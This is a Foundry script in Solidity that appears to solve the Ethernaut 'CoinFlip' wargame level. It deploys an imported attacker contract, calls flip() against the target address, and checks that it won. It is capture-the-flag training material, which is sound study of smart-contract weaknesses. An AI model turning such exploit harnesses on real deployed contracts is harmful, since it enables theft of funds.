// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { CoinFlipCracker, CoinFlip } from "../../src/ethernaut/CoinFlipCracker.sol";

contract CoinFlipCrackerScript is Script {
  function run() external {
    CoinFlip coinFlip = CoinFlip(vm.envAddress("ETHERNAUT_COIN_FLIP_ADDRESS"));

    vm.startBroadcast(vm.envAddress("ETH_FROM"));
    CoinFlipCracker cracker = new CoinFlipCracker(coinFlip);
    cracker.flip();
    vm.stopBroadcast();

    assert(coinFlip.consecutiveWins() == 1);
    assert(address(coinFlip).balance == 0);
  }
}
